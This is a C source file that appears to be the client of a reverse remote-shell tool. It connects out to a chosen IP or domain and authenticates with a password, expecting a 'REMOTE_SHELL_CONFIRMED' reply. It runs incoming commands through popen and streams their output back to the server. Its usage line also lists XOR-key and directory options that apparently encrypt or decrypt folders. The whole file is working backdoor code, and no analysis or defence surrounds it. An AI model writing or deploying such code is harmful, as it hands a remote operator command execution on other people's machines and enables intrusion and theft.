#include "client_base.h"

// Print the usage message for the client program
void print_usage(const char *prog_name) {
    fprintf(stderr, "Usage: %s [-i <ip/domain>] [-p <port>] [-w <password>] [-e <dir>] [-d <dir>] [-k <xor_key>]\n", prog_name);
}

// Print an error message and exit the program
void error_exit(const char *message) {
    perror(message);
    exit(EXIT_FAILURE);
}

// Authenticate with the server using the provided password
int authenticate(int sockfd, const char *password) {
    char buffer[BUFFER_SIZE];

    // Send the password to the server
    if (send(sockfd, password, strlen(password), 0) < 0) {
        perror("Error sending password to server");
        return 0;
    }

    // Wait for the authentication response
    int bytes_received = recv(sockfd, buffer, BUFFER_SIZE - 1, 0);
    if (bytes_received < 0) {
        perror("Error receiving authentication response");
        return 0;
    }

    buffer[bytes_received] = '\0'; // Null-terminate the response

    // Check if the server's response contains the confirmation message
    if (strstr(buffer, "REMOTE_SHELL_CONFIRMED") != NULL) {
        printf("Authentication successful.\n");
        return 1;
    } else {
        printf("Authentication failed: %s\n", buffer);
        return 0;
    }
}

// Execute a shell command and send the output back to the server
void execute_command_and_send_output(const char *command, int sockfd) {
    char output_buffer[BUFFER_SIZE];
    FILE *fp;

    // Open a pipe to execute the command
    fp = popen(command, "r");
    if (!fp) {
        snprintf(output_buffer, BUFFER_SIZE, "Failed to execute command: %s\n", command);
        send(sockfd, output_buffer, strlen(output_buffer), 0);
        return;
    }

    // Read the command's output and send it to the server line by line
    while (fgets(output_buffer, BUFFER_SIZE, fp)) {
        send(sockfd, output_buffer, strlen(output_buffer), 0);
    }

    // Close the pipe
    pclose(fp);
}

// Initialize a connection to the server
int initialize_connection(const char *server_ip, int server_port) {
    int sockfd;
    struct sockaddr_in server_addr;

    // Create a socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return -1;
    }

    // Configure the server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);

    // Convert IP address from text to binary form
    if (inet_pton(AF_INET, server_ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid server IP address");
        close(sockfd);
        return -1;
    }

    // Connect to the server
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection to server failed");
        close(sockfd);
        return -1;
    }

    return sockfd;
}

// Detect the available shell on the client system
int detect_shell(char *shell_path, size_t size) {
    if (access("/bin/sh", X_OK) == 0) {
        strncpy(shell_path, "/bin/sh", size);
        return 0;
    }
    if (access("/bin/bash", X_OK) == 0) {
        strncpy(shell_path, "/bin/bash", size);
        return 0;
    }
    fprintf(stderr, "No supported shell found on this system.\n");
    return -1;
}